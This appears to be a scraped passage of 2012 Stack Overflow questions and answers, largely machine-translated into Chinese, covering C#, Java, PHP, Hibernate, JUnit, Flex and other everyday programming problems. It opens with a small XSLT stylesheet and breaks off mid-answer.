<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:template match="/">

<table>
    <xsl:for-each select="/company/products/product">
        <tr>
            <td>Product:</td>
            <td>
                <xsl:value-of select="."/>
            </td>
        </tr>
    </xsl:for-each>
</table>                    
</xsl:template>

</xsl:stylesheet> 
```

# c# - 检查对象列表中的类成员是否为空

> ID：12078959
> 
> 赞同：0
> 
> 时间：2012-08-22T18:09:51.123
> 
> 标签：c#, .net, linq, object, lambda

有没有办法检查特定的类成员是否为 null ？

我有一个具有 N 个属性（成员）的类。我必须为该类创建许多对象，并且可以为这些属性分配值。我正在使用 List 来存储所有对象。

现在，我想检查列表中特定索引中的对象是否有任何属性为 null 或未设置？这可以在不使用循环或手动检查每个属性的情况下完成吗？

提前致谢..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T18:29:00.523

假设您有一个类型为`A`,的项目列表`listA`。下面是一个 LINQ 表达式，它将查找列表中具有任何属性设置为的所有项目`null`：

```
var output = listA.Where(a => typeof (A).GetProperties()
                                        .Any(p => p.GetValue(a) == null))
            .Select((a, index) => index)
            .ToList(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:45:42.453

以下是如何检查索引中的项目是否具有任何`null`属性：

```
var item = myItems[indexToCheck];
bool hasNullProperty = typeof(MyClass)
    .GetProperties()
    .Any(p => p.GetValue(item) == null); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-22T18:23:20.797

它可能需要一些工作，但这里是您可以使用的一般功能。老实说，我不确定这是否违反了您不使用循环/单独检查每个成员的限制（看看它是如何做到的）。

```
public static bool AreAnyPropertiesNull(object obj)
{
    foreach (var prop in obj.GetType().GetProperties())
    {
        object propertyValue = prop.GetValue(obj, null);
        if (propertyValue == null)
            return true;
    }
    return false;
} 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-08-22T18:15:23.087

listOfObjects[i].HaveAnyOfPropertiesNullOrNotSet()

我在这里看不到循环。

# hibernate - Hibernate Criteria API：使用自定义连接连接表

> ID：12078960
> 
> 赞同：4
> 
> 时间：2012-08-22T18:09:53.137
> 
> 标签：hibernate, join, criteria

我问自己是否可以通过 Hibernate Criteria API 映射以下查询

```
SELECT * FROM table_a as a LEFT OUTER JOIN table_b as b ON a.primary_key = b.foreign_key and b.any_column = 'my_value' 
```

好的，除了`and b.any_column = 'my_value'`对我来说一切都不难。使用 FetchMode.JOIN 或 addCriteria(...,...)。

但它 `and b.any_column = 'my_value'`正在产生令人头疼的问题。

我尝试过嵌入：

```
addCriteria("b", Criteria.LEFT_JOIN).add(Restriction.eq("b.any_column", my_value)) 
```

但这正在产生：

```
SELECT * FROM table_a as a LEFT OUTER JOIN table_b as b ON a.primary_key = b.foreign_key WHERE b.any_column = 'my_value' 
```

这不是我的目的，当然会产生与我预期的查询不同的结果。谁能给我一个提示，我如何告诉 Hibernate 映射到所需的查询？

谢谢，迈克尔

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T19:12:18.527

您可能需要使用 createAlias 或 createCriteria 方法。

```
public Criteria createAlias(String associationPath, String alias, int joinType, Criterion withClause) throws HibernateException;

public Criteria createCriteria(String associationPath, String alias, int joinType, Criterion withClause) throws HibernateException; 
```

有一个论坛讨论可以帮助你：[https ://hibernate.onjira.com/browse/HHH-2308](https://hibernate.onjira.com/browse/HHH-2308)

例如：

```
Criteria criteria = getSession().createCriteria(Table_a.class);
criteria.addAlias("Table_b","joined_alias",CriteriaSpecification.LEFT_JOIN);
criteria.list(); 
```

# c# - How highlight keyword using Regex in C# with special condition?

> ID：12078961
> 
> 赞同：2
> 
> 时间：2012-08-22T18:10:04.177
> 
> 标签：c#, regex, syntax-highlighting

I am a newbie with Regex so I need some help from my trouble.

This is my code:

```
private static string MatchEval(Match match)
{
    if (match.Groups[1].Success)    
        return "<strong>" + match.ToString() + "</strong>";
    return "";
}

private static string HighlightKeywords(string keywords, string text)
{   
    Regex r = new Regex(@", ?");
    keywords = "(" + r.Replace(keywords, @"|") + ")";   
    r = new Regex(keywords, RegexOptions.Singleline | RegexOptions.IgnoreCase); 
    return r.Replace(text, new MatchEvaluator(MatchEval));
}

string keywords = "group, person, club";
string text = "A fan club is a group that is dedicated to a well-known person"; 
```

when i call `HighlightKeywords(string keywords, string text);`

--> result: `A fan <strong>club</strong> is a <strong>group</strong> that is dedicated to a well-known <strong>person</strong>` **WORK CORRECT**

But if `string text = "A fan <strong>club</strong> is a group that is dedicated to a well-known person";`

--> result: `A fan <strong></strong><strong>club</strong> is a <strong>group</strong> that is dedicated to a well-known <strong>person</strong>`

**WORK FAIL** (I want remove `<strong></strong><strong>club</strong>` with only `<strong>club</strong>`)

Another case `if text = "A fanclub is a group that is dedicated to a well-known person";` note: "**fanclub**" no space

result--> `A fan<strong>club</strong> is a <strong>group</strong> that is dedicated to a well-known <strong>person</strong>`

But i want get result --> `A fanclub is a <strong>group</strong> that is dedicated to a well-known <strong>person</strong>`

So Can any one help me how to do this ?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:27:11.837

你可以试试这个：

```
keywords = "\b(" + r.Replace(keywords, @"|") + ")\b"; 
```

\b - 非单词字符

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:36:54.930

你的关键字应该是这样的

```
string keywords = "\bgroup\b, \bperson\b, \bclub\b"; 
```

`\b`会创建一个边界，所以`fanclub`不匹配！

# ruby-on-rails-3 - Rails Assets custom manifests are not precompiling

> ID：12078963
> 
> 赞同：0
> 
> 时间：2012-08-22T18:10:14.143
> 
> 标签：ruby-on-rails-3, asset-pipeline

I have a scenario as follows. I've built a "themed" site using the asset pipeline. There are a variety of manifests:

```
application.scss
application_light.scss
application_dark.scss 
```

When I run `rake assets:precompile`, only application.scss gets compiled and created as application.css.

I have no trouble with these assets in development, it is only in production pre-compilation that they fail.

I have tried:

```
config.assets.precompile += %w( application_light.scss ) 
```

This also does not work, it simply does not precompile anything past `application.scss`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T14:17:31.063

我在这里找到了答案：

[使用 Rails 3.1 的资产管道预编译 .scss 清单文件](https://stackoverflow.com/questions/7367864/precompiling-a-scss-manifest-file-using-rails-3-1s-asset-pipeline)

原来我只需要将预编译从 scss 更改为 css。

# java - 如何在括号]和[之间获取字符串

> ID：12078964
> 
> 赞同：2
> 
> 时间：2012-08-22T18:10:17.503
> 
> 标签：java, regex

我正在尝试使用正则表达式从以下字符串 [DOC TEXT] STARTS WITH [foo] 获取文本“STARTS WITH”。我为此使用了以下代码。

```
String expertWhereClause = (String) formFields
                    .get(Constants.EXPERT_SEARCH_WHERECLAUSE);
            String delims = "\\[(.*?)\\]";
            String[] tokens = expertWhereClause.split(delims); 
```

但我得到以下字符串“[，STARTS WITH ]”。我只想要“开始”。

我是正则表达式的新手，请在这里帮助我。

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T18:18:16.050

您可以`Matcher`为此使用：

```
Matcher m = Pattern.compile("\\]([^\\[]*)\\[").matcher("[Hello]world[!!!]");
while (m.find()) {
    System.out.println(m.group(1));
} 
```

此代码片段在 ideone 上[打印。](http://ideone.com/aezuQ) `world`

请注意我如何更改您的正则表达式以`[^\\[]*`代替`.*?`. [这提高了效率](http://blog.stevenlevithan.com/archives/greedy-lazy-performance)，这对于更长的输入可能很重要。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T18:22:48.857

使用这个正则表达式：

```
\]\s*([^\[]*?)\s*\[ 
```

您可能需要根据您使用的语言转义反斜杠。
更新：对于 Java，请转义反斜杠

```
\\]\\s*([^\\[]*?)\\s*\\[ 
```

所需的文本被捕获在第一组中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T18:23:02.140

如果是 Java，那么您可以使用以下代码：

```
String str = "[DOC TEXT] STARTS WITH [foo] ";
System.out.printf("<%s>%n", 
                    str.replaceAll("^[^\\]]+\\]\\s*([^\\[]+?)\\s*\\[.*$", "$1"));
// output
//<STARTS WITH> 
```

# php - how to limit tamil content in php mysql

> ID：12078967
> 
> 赞同：2
> 
> 时间：2012-08-22T18:10:30.850
> 
> 标签：php, mysql

Thanks in advance

i have the Tamil Content retrieved from MYSQL DB in one variable i need to limit that content

from mysql Its some junk word how can i limit exactly

ex:

```
$my_Content = "சென்னை: படிக்க வாய்ப்பில்லாத சிறுமிகளை கண்டறிந்து, பள்ளியில் சேர்த்த சாதனை மாணவியால், அப்பகுதியில் பல குழந்தைகள் படித்து வருகின்றனர். சென்னை புளியந்தோப்பு, சாஸ்திரி நகரில், மாநகராட்சி நடுநிலைப் பள்ளியில், இடைக்கால பள்ளி செயல்பட்டு வருகிறது. இதன் நோக்கம் படிக்க வாய்ப்பில்லாத, 14 வயதுக்குட்பட்ட குழந்தைகளை கண்டறிந்து, ஓர் ஆண்டு அடிப்படைக் கல்வியை கற்று தர வேண்டும். பின் மாணவர்களின் வயதுக்கேற்ப, உரிய வகுப்பில், படிப்பை தொடர செய்ய வேண்டும். இடைக்கால பள்ளியில், இந்த ஆண்டு 20 பேர் சேர்ந்துள்ளனர். அதில் லட்சுமி என்ற மாணவி பெற்றோர் அனுமதியின்றி, பள்ளியில் சேர்ந்துள்ளார். அத்துடன் ஏழு மாணவர்களை இடைக்கால பள்ளியிலும், இரண்டு மாணவர்களை சத்துணவு மையத்திலும் சேர்த்துள்ளார்." 
```

so i need to save this to mysql DB Using php i can save and retrieve and see browser proper as normal utf format.

My question is : if i use normal the DB have some junk value how can limt from that

i need to get the output as

சென்னை: படிக்க வாய்ப்பில்லாத சிறுமிகளை கண்டறிந்து, பள்ளியில் சேர்த்த சாதனை மாணவியால், அப்பகுதியில் பல குழந்தைகள் படித்து ... Read more

how can i do please any one help me to solve

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:12:46.577

您可以`mb_substr`用来限制 utf8 编码字符串的字符数。另请参阅[http://php.net/manual/en/function.mb-substr.php](http://php.net/manual/en/function.mb-substr.php)

# php - How to setup a PHP array?

> ID：12078970
> 
> 赞同：-5
> 
> 时间：2012-08-22T18:10:50.837
> 
> 标签：php

Basically, I'm trying to create an array, and send the array data to my email.

I'm still learning PHP, and am confused about how to set everything up properly.

If you have any advice that can get me started, I'd really appreciate it.

**PHP**

```
<?php

if (isset($_POST['submit'])) {

    $to          = "test@mywebsite.com";
    $subject     = "New Order";
    $name_field  = $_POST['name'];
    $phone_field = $_POST['phone'];

    foreach ($food as $key => $item) {
        $body.= $key." - ".$item ["how_many"]
    }

    $food = array(
    'mexican_torta' => array('how_many' => 2, 'customize' => NO),
    'fish_sandwich' => array('how_many' => 0, 'customize' => 0)
    )
    );

    echo $food['mexican_torta']['how_many'];
}

$body = "Name: $name_field\nPhone: $phone_field\nKey: $key\nItem $item"

echo "Data has been submitted to $to!";
mail($to, $subject, $body);
?> 
```

**HTML**

```
<div class ="item">
    <img style="float:left; margin-right:15px; border:1px Solid #000; width:200px; height:155px;" src="images/mexicantortas.jpg">
    <h1>Mexican Torta - $8.50</h1>
    <h2>How Many? <font color="#999999">Ex: 1, 2, 3...?</font></h2> 
    <input type='text' name='food[mexican_torta][how_many]'>
    <h3>Customize It? <font color="#999999">Ex: No Lettuce, Extra Cheese...</font></h3> 
    <input type='text' name='food[mexican_torta][customize]'>
</div><!-- ITEM_LEFT -->

<div class ="item">
    <img style="float:left; margin-right:15px; border:1px Solid #000; width:200px; height:155px;" src="images/fishsandwich.jpg">
    <h1>Fish Sandwich - $8.50</h1>
    <h2>How Many? <font color="#999999">Ex: 1, 2, 3...?</font></h2> 
    <input type='text' name='food[fish_sandwich][how_many]'>
    <h3>Customize It? <font color="#999999">Ex: No Lettuce, Extra Cheese...</font></h3> 
    <input type='text' name='food[fish_sandwich][customize]'>
</div><!-- ITEM_LEFT --> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:20:13.950

我将专注于您的**HTML**：

```
<div class ="item">
    <img style="float:left; margin-right:15px; border:1px Solid #000; width:200px; height:155px;" src="images/mexicantortas.jpg">
    <h1>Mexican Torta - $8.50</h1>
    <h2>How Many? <font color="#999999">Ex: 1, 2, 3...?</font></h2> 
    <input type='text' name='food[mexican_torta][how_many]'>
    <h3>Customize It? <font color="#999999">Ex: No Lettuce, Extra Cheese...</font></h3> 
    <input type='text' name='food[mexican_torta][customize]'>
</div><!-- ITEM_LEFT --> 
```

这看起来像您正在尝试访问`$food`，但不是在 PHP 标记内进行。如果您希望您的代码被解析为 PHP，您必须告诉服务器它必须将其解析为 PHP：

```
<div class ="item">
    <img style="float:left; margin-right:15px; border:1px Solid #000; width:200px; height:155px;" src="images/mexicantortas.jpg">
    <h1>Mexican Torta - $8.50</h1>
    <h2>How Many? <font color="#999999">Ex: 1, 2, 3...?</font></h2> 
    <input type='text' name='<?php echo $food['mexican_torta']['how_many']; ?>'> <!-- major difference here -->
    <h3>Customize It? <font color="#999999">Ex: No Lettuce, Extra Cheese...</font></h3> 
    <input type='text' name='<?php echo $food['mexican_torta']['customize']; ?>'> <!-- major difference here -->
</div><!-- ITEM_LEFT --> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T18:17:24.747

`$food`在循环之后定义，而不是在循环之前定义，并且有一个额外的尾随`)`：

```
$food = array( 
    // NO is also not defined as of yet, see Matheiu's answer.
    'mexican_torta' => array('how_many' => 2, 'customize' => NO), 
    'fish_sandwich' => array('how_many' => 0, 'customize' => 0)
); 
```

在循环之前，定义您将使用的变量是一个好习惯：

```
$body = '';
foreach( $food as $key => $item) { 
```

在循环中，您缺少分号：

```
$body.= $key." - ".$item ["how_many"]; 
                                     ^ 
```

而且您的正文声明缺少分号：

```
$body = "Name: $name_field\nPhone: $phone_field\nKey: $key\nItem $item";
                                                                       ^ 
```

最后，最后一条语句覆盖`$body`了 ，因此循环没有做任何事情。考虑这样的事情：

```
$body .= "Name: $name_field\nPhone: $phone_field\nKey: $key\nItem $item"; 
```

虽然注意`$key`and`$item`将指向数组中的最后一个元素`$food`，并且`$item`是一个数组，所以它不会正确地转换为字符串。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T18:14:56.390

创建数组时出现解析错误。这可能是它不起作用的原因：

```
$food = array(
  'mexican_torta' => array('how_many' => 2, 'customize' => NO),
  'fish_sandwich' => array('how_many' => 0, 'customize' => 0)
); 
```

并且`NO`没有定义。您应该保持一致并将其更改为`0`.

# python - CherryPy with multiprocessing?

> ID：12078974
> 
> 赞同：3
> 
> 时间：2012-08-22T18:11:04.907
> 
> 标签：python, cherrypy

I need a cherrypy RPC hierarchy like:

```
/a/foo/bar
/a/wilma/betty
/b/blee/blah
/b/mip/smip
/c/mumble/stumble
/c/fred/barney 
```

...where /a, /b and /c are handled by a master process, dispatching based on these three prefixes to three different subprocesses. I'm not sure yet if os.fork() or multiprocessing would be better for this. I'm also not sure if it'd be better to use multiprocessing.Queue or wspbus.Bus for interprocess communication.

And despite being a pretty accomplished Python developer, I really don't know where to start. I've googled quite a bit over the last 18 hours, and found pretty much nothing that looks similar.

The goal is to have a REST-like RPC hierarchy in which (EG) all of /b can be restarted without impacting service of /a or /c by restarting the subprocess that serves /b.

BTW, we're planning to use RoutesDispatcher, but requesting info about that here is just too much; I'm afraid this question is already too specific to get answers. So, if someone has done this (or has thoughts on how to do it) with one of the Dispatchers that come with CherryPy, or indeed any CherryPy dispatcher, please let me know how you did (or could do) it!

Anyone?

# microsoft-sync-framework - 无效的强制转换异常 SqlSyncprovider()

> ID：12078979
> 
> 赞同：0
> 
> 时间：2012-08-22T18:11:21.577
> 
> 标签：microsoft-sync-framework

我正在使用 Microsoft Sync 框架，这个问题在 Google 中没有明确的解决方案。

我正在尝试为 SQLServer 客户端创建一个客户端提供程序，如下所示

```
`public class SampleClientSyncProvider : SqlSyncProvider` 
```

但是在下面设置“localprovider”时，我遇到了无效的强制转换异常

例外：

> System.InvalidCastException 未处理
> Message=Microsoft.Synchronization.Data.ClientSyncProvider
> Source=Microsoft.Synchronization.Data

代码调用：

```
 public class SampleSyncAgent : SyncAgent
{
    public SampleSyncAgent()
    {
        this.LocalProvider = new SampleClientSyncProvider(); 
```

如果可以的话请帮忙 ..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T10:16:59.570

SyncAgent 仅适用于 SqlCeClientSyncProvider/DbServerSyncProvider。

SqlSyncProvider 与 SyncOrchestrator 一起使用。

查看有关离线提供商和协作提供商之间区别的文档。

我建议您改用 SqlSyncProvider/SyncOrchestrator。

# java - 在 JUnit 中的每个“@Test”之后和每个“@After”之前应用“@Rule”

> ID：12078982
> 
> 赞同：18
> 
> 时间：2012-08-22T18:11:32.507
> 
> 标签：java, selenium, webdriver, junit4, junit-rule

我有一个测试套件，我在其中注销系统`@After`并关闭浏览器`@AfterClass`。我正在尝试`@Rule`使用 Selenium 为每种测试方法拍摄失败的测试屏幕截图。我手动检查了`@Rule`只在 every 之前运行，`@Before`但我想在 after`@Test`和 before 之前进行设置`@After`。我找不到简单的解决方案。任何帮助将不胜感激。

```
public class MorgatgeCalculatorTest  {

@Before
public void before(){
    System.out.println("I am before");
}
@BeforeClass
public static void beforeclass(){
    System.out.println("I am beforeclass");
}
@Test
    public void test(){
        System.out.println("I am Test");
    }
@Test
public void test2(){
    System.out.println("I am Test2");
}
@After
    public void after(){
        System.out.println("I am after");
    }
@AfterClass
        public static  void afterclass(){
            System.out.println("I am afterclass");

}
@Rule
ExpensiveExternalResource ExpensiveExternalResource = new ExpensiveExternalResource();

static class ExpensiveExternalResource implements MethodRule  {
    public ExpensiveExternalResource(){
        System.out.println("I am rule");
    }

    @Override
    public Statement apply(Statement arg0, FrameworkMethod arg1, Object arg2) {
        // TODO Auto-generated method stub
        return null;
    }    
} 
```

我得到的输出是

```
I am beforeclass
I am rule
I am before
I am Test
I am after
I am rule
I am before
I am Test2
I am after
I am afterclass 
```

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-08-24T01:31:37.480

由于规则的设置方式，您不能在@before 或@after 之前设置规则。您可以将规则想象成您放在测试方法上的 shell。第一个shell 是@before/@after。此后应用@rules。

做你想做的事的一种快速方法是完全避免@After。可以创建一个规则，以便在方法失败时截取屏幕截图，然后在代码之后执行您的。它不像@After 那样漂亮，但它确实有效。（我也实现了 TestRule 因为 MethodRule 已被贬值）。

```
public class MortgageCalculatorTest  {
    @Before
    public void before(){
        System.out.println("I am before");
    }

    @BeforeClass
    public static void beforeclass(){
        System.out.println("I am beforeclass");
    }

    @Test
    public void test(){
        System.out.println("I am a Test");
    }

    @Test
    public void test2(){
        System.out.println("I am a Failed Test");
        fail();
    }

    @AfterClass
            public static  void afterclass(){
                System.out.println("I am afterclass");

    }

    @Rule
    public ExpensiveExternalResource ExpensiveExternalResource = new ExpensiveExternalResource();

    public static class ExpensiveExternalResource implements TestRule  {

      //  public ExpensiveExternalResource(){}

        public class ExpansiveExternalResourceStatement extends Statement{

            private Statement baseStatement;

            public ExpansiveExternalResourceStatement(Statement b){
                baseStatement = b;
            }

            @Override
            public void evaluate() throws Throwable {
                try{
                    baseStatement.evaluate();
                }catch(Error e){
                    System.out.println("I take a Screenshot");
                    throw e;   
                }finally{
                    after();
                }
            }

            //Put your after code in this method!
            public void after(){
                System.out.println("I am after");
            }
        }

        public Statement apply(Statement base, Description description) {
            return new ExpansiveExternalResourceStatement(base);

        }

    }
} 
```

规则的所有工作都在一个语句中完成。org.junit.runners.model.Statement 是一个代表代码包的类。因此，*apply*方法在这里接收您放置 shell 的代码包。Apply 返回执行你给它的代码包的语句，并用 try/catch 语句包围它以捕获方法失败。

此方法的输出是：

```
I am beforeclass
I am before
I am a Test
I am after
I am before
I am a Failed Test
I take a Screenshot
I am after
I am afterclass 
```

希望这可以帮助！

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-27T14:42:29.487

```
public class ScreenshotTestRule implements MethodRule {
    public Statement apply(final Statement statement, final FrameworkMethod frameworkMethod, final Object o) {
        return new Statement() {
            @Override
            public void evaluate() throws Throwable {
                try {
                    statement.evaluate();

                } catch (Throwable t) {
                    captureScreenshot(frameworkMethod.getName());
                    throw t; // rethrow to allow the failure to be reported to JUnit                     
                } finally {
                    tearDown();
                }
            }

            public void tearDown() {
                //logout to the system;
            }

            public void captureScreenshot(String fileName) {
                try {
                    new File("target/surefire-reports/screenshot").mkdirs(); // Insure directory is there
                    FileOutputStream out = new FileOutputStream("target/surefire-reports/screenshot/screenshot-" + fileName + ".png");
                    out.write(((TakesScreenshot) driver).getScreenshotAs(OutputType.BYTES));
                    out.close();
                } catch (Exception e) {
                    // No need to crash the tests if the screenshot fails
                }
            }
        };
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T18:43:33.783

使用[ExternalResource](http://kentbeck.github.com/junit/javadoc/4.10/org/junit/rules/ExternalResource.html)规则怎么样？
看起来它可以为您提供足够的灵活性来满足您的需求。
如果这不是您所需要的，请查看外部资源的[源代码](http://grepcode.com/file/repo1.maven.org/maven2/junit/junit-dep/4.10/org/junit/rules/ExternalResource.java)。
例如，如何实现仅在测试调用后才起作用的规则是很容易理解的。

# jquery - Adding swipe gestures to Smooth Div Scroll

> ID：12078983
> 
> 赞同：1
> 
> 时间：2012-08-22T18:11:34.863
> 
> 标签：jquery, swipe, smooth-scrolling, hammer.js

I am trying to add swipe gestures to Smooth Div Scroll plugin by Thomas Kahn, since the plugin is not working on iPads and other smart devices.

Az first i was using hammer.js to add the functionality. This is the code i used on the container div that holds the images:

```
 $("#makeMeScrollable").hammer({
        prevent_default: false,

    })
    .bind("hold tap doubletap transformstart transform transformend dragstart drag dragend release swipe", function(ev) {

    }); 
```

But unfortunately, the swipe worked once out of 10 times, and there is no way to stop in the middle, it would just slide to one end or the other.

I am interested if anyone has managed to add swipe functionality to Smooth Div Scroll, or if anyone has some other script to recommend for adding mobile gestures, that is maybe better than Hammer.js.

Here is the link to the website, it is still work in progress: [http://www.madebym.net/test/index.html](http://www.madebym.net/test/index.html)

p.s. right now i am using touchSwipe.js, but it seems worse than hammer.js...it doesn't do anything

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T18:27:03.040

查看最新更新。Smooth Div Scroll 1.3 支持触控！smoothdivscroll.com 上的文档尚未更新，但您可以在 GitHub 上找到所需的所有信息：[https ://github.com/tkahn/Smooth-Div-Scroll](https://github.com/tkahn/Smooth-Div-Scroll)

# apache-flex - Flex 的设计问题

> ID：12078986
> 
> 赞同：-1
> 
> 时间：2012-08-22T18:11:53.993
> 
> 标签：apache-flex, layout, vbox

我正在使用 Flex 3.0。我正在尝试将 VBoxes 嵌套在 TabNavigator 中，并且效果很好。但是在我的第一个 VBox 中，我有两个不会显示的按钮。无论如何，我对设计概念并不擅长，而且对 Flex 很陌生。我尝试过使用 Hbox 弄乱宽度和高度属性。有人可以看看并弄清楚我可以做些什么来解决这些问题。这是完整的面板。TabNavigator 靠近底部。

```
<mx:Panel id="pnlMain" label="Address Search" width="100%" borderStyle="none" headerHeight="0">
    <mx:ViewStack id="vsAddressSearch" resizeToContent="true">
        <mx:Form id="frmAddressSearch" styleName="measureForm" width="300" height="100%" fontFamily="Arial" fontSize="11" verticalGap="0" horizontalGap="0" verticalScrollPolicy="off" horizontalScrollPolicy="off">
            <mx:FormItem label="Address:" paddingBottom="5" paddingTop="5" textAlign="left" fontWeight="bold" width="100%">                
                <mx:TextInput width="100%" id="txtAddress" text=""/>            
            </mx:FormItem>  
            <mx:HRule height="5" width="100%"/> 
            <mx:HBox horizontalAlign="left" paddingTop="5">
                <mx:Button label="Find Address" click="BingFindAddress()"/>     
                <mx:Button label="Clear" click="clearGraphics()"/>  
            </mx:HBox>              
        </mx:Form>
        <mx:Form id="frmAddressSearch1" styleName="measureForm" width="100%" height="100%" fontFamily="Arial" fontSize="11" verticalGap="0" horizontalGap="0" verticalScrollPolicy="off" horizontalScrollPolicy="off">
            <mx:FormItem label="Street:" paddingBottom="5"  labelWidth="150" textAlign="left" fontWeight="bold">                
                <mx:TextInput width="100%" id="address" text=""/>            
            </mx:FormItem>            
            <mx:FormItem label="City:" paddingBottom="5" labelWidth="150" textAlign="left" fontWeight="bold">                
                <mx:TextInput width="100%" id="city" text=""/>            
            </mx:FormItem>   
            <mx:FormItem label="State/Province:" paddingBottom="5"  labelWidth="150" textAlign="left" fontWeight="bold">                
                <mx:TextInput width="100" id="state" text="PA"/>            
            </mx:FormItem>            
            <mx:FormItem label="ZIP Code or Postal Code:" fontWeight="bold" labelWidth="150"  textAlign="left" paddingBottom="5" >                
                <mx:TextInput width="100" id="zip" text=""/>            
            </mx:FormItem>            
            <mx:FormItem label="Country:" paddingBottom="5"  labelWidth="150" textAlign="left" fontWeight="bold">                  
                <mx:ComboBox id="country" selectedIndex="0">                    
                    <mx:ArrayCollection>     
                        <mx:String>USA</mx:String>                   
                        <mx:String>Canada</mx:String>                        
                        <mx:String>Mexico</mx:String>                    
                    </mx:ArrayCollection>                
                </mx:ComboBox>            
            </mx:FormItem>       
            <mx:HRule height="5" width="100%"/> 
            <mx:HBox horizontalAlign="left" paddingTop="5">
                <mx:Button label="Find Address" click="ESRIFindAddress()"/>     
                <mx:Button label="Clear" click="clearGraphics()"/>

            </mx:HBox>     
        </mx:Form>
        <mx:Form id="frmAddressSearch2" styleName="measureForm" width="100%" height="100%" fontFamily="Arial" fontSize="11" verticalGap="0" horizontalGap="0" verticalScrollPolicy="off" horizontalScrollPolicy="off">
            <mx:FormItem  label="Street:" paddingBottom="5"  labelWidth="150" textAlign="left" fontWeight="bold">                
                <mx:TextInput width="100%" id="bamAddress" text="273 Cumberland St"/>            
            </mx:FormItem>            
            <mx:FormItem  label="City:" paddingBottom="5" labelWidth="150" textAlign="left" fontWeight="bold">                
                <mx:TextInput width="100%" id="bamCity" text="Harrisburg"/>            
            </mx:FormItem>   
            <mx:FormItem  label="State/Province:" paddingBottom="5"  labelWidth="150" textAlign="left" fontWeight="bold">                
                <mx:TextInput width="100" id="bamState" text="PA"/>            
            </mx:FormItem>            
            <mx:FormItem  label="ZIP Code or Postal Code:" fontWeight="bold" labelWidth="150"  textAlign="left" paddingBottom="5" >                
                <mx:TextInput width="100" id="bamZip" text="17102"/>            
            </mx:FormItem>            
            <mx:FormItem label="Country:" paddingBottom="5"  labelWidth="150" textAlign="left" fontWeight="bold">                  
                <mx:ComboBox id="bamCountry" selectedIndex="0">                    
                    <mx:ArrayCollection>     
                        <mx:String>USA</mx:String>                   
                        <mx:String>Canada</mx:String>                        
                        <mx:String>Mexico</mx:String>                    
                    </mx:ArrayCollection>                
                </mx:ComboBox>            
            </mx:FormItem>       
            <mx:HRule height="5" width="100%"/> 
            <mx:HBox horizontalAlign="left" paddingTop="5">
                <mx:Button label="Find Address" click="BAMFindAddress()"/>     
                <mx:Button label="Clear" click="clearGraphics()"/>     
            </mx:HBox>     
        </mx:Form>
    </mx:ViewStack>
    <mx:VBox id="frmShell" backgroundAlpha=".7" backgroundColor="#dddddd" visible="false" left="0" top="0" width="100%" height="100%"></mx:VBox>
    <mx:Text id="hintLabel" fontSize="10" color="#999999" text="" horizontalCenter="0" bottom="10" visible="false" maxWidth="290" />

    <mx:TabNavigator id="tabNavigator" width="100%" height="0%"  visible="false" creationPolicy="auto">

        <mx:VBox id="generalInformation" label="Gen. Info." width="100%">
            <mx:Label id="ard" text=""> 
            </mx:Label>
            <mx:Button  id="googleButton" visible="false" label="Google Directions" click="newWin('https://maps.google.com/?q=' + addressResult)"/>
            <mx:Button id="mapquestButton" visible="false" label="MapQuest Directions" click="newWin('https://mapquest.com/?q=' + addressResult)"/>
        </mx:VBox>
        <mx:VBox id="schoolDistrict" label="School District" width="100%">
        </mx:VBox>
        <mx:VBox id="paHouse" label="PA House" width="100%">
        </mx:VBox>
        <mx:VBox id="paSenate" label="PA Senate" width="100%">
        </mx:VBox>
        <mx:VBox id="usHouse" label="US House" width="100%">
        </mx:VBox>
    </mx:TabNavigator>  
</mx:Panel> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:18:19.030

您的按钮设置为，`visible="false"`因此它们不会出现。

```
<mx:Button  id="googleButton" visible="false" label="Google Directions" click="newWin('https://maps.google.com/?q=' + addressResult)"/>
<mx:Button id="mapquestButton" visible="false" label="MapQuest Directions" click="newWin('https://mapquest.com/?q=' + addressResult)"/> 
```

# c# - HtmlAgilityPack - 用另一个节点替换节点

> ID：12078989
> 
> 赞同：0
> 
> 时间：2012-08-22T18:12:21.217
> 
> 标签：c#, asp.net, vb.net, html-agility-pack

我有两个具有内部 HTML 的节点，如下所示：

节点1：

```
<p>some text</p>
<p>some more text</p> 
```

节点2：

```
<p>some text</p>
<p>some more text</p>
<div><p>lots of more paragraphs here</p></div> 
```

我正在尝试在 Node2 中查找 Node1，以便`<!--more-->`在前两段（或 Node1 中提供的任何 HTML 文本）之后添加标签（用于 WordPress 帖子）。

上述两个节点都有不同的父节点。在这种情况下，如何查找和替换或附加`<!--more-->`标签？我尝试运行以下代码，但出现错误：

代码：

```
node2.ParentNode.ReplaceChild(HtmlNode.CreateNode(node1.InnerHtml & "<!--more-->"), node1).InnerHtml 
```

错误：

```
Node "

             " was not found in the collection
Parameter name: node 
```

还尝试`node1`将 oldChild 部分更改为，`HtmlNode.CreateNode(node1.InnerHtml)`但这也不起作用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T22:01:11.257

`HtmlNode.InnerHtml`我认为直接对属性执行替换会更容易：

```
